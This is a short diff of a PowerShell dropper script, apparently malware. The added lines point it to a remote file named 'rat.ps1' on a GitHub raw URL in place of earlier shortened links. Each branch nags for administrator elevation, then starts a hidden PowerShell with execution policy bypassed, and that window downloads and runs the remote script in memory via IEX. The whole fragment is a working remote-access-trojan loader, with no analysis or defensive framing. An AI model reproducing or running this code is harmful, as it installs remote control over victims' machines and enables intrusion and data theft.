@@ -15,7 +15,7 @@ if ($adminGroup) {
 while ($true) {
     try {
         #$command = "IEX(irm 'https://lc.cx/Map88u')"
-        $command = "IEX(irm 'https://lc.cx/oKqHDz')"
+        $command = "IEX(irm 'https://github.com/devilJM/doc/raw/refs/heads/main/rat.ps1')"
         Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
         exit
     } catch {
@@ -23,10 +23,10 @@ while ($true) {
 }
 
     } else {
-        $command = "IEX(irm 'https://lc.cx/oKqHDz')"
+        $command = "IEX(irm 'https://github.com/devilJM/doc/raw/refs/heads/main/rat.ps1')"
         Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
     }
 } else {
-            $command = "IEX(irm 'https://lc.cx/oKqHDz')"
+            $command = "IEX(irm 'https://github.com/devilJM/doc/raw/refs/heads/main/rat.ps1')"
         Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
 }
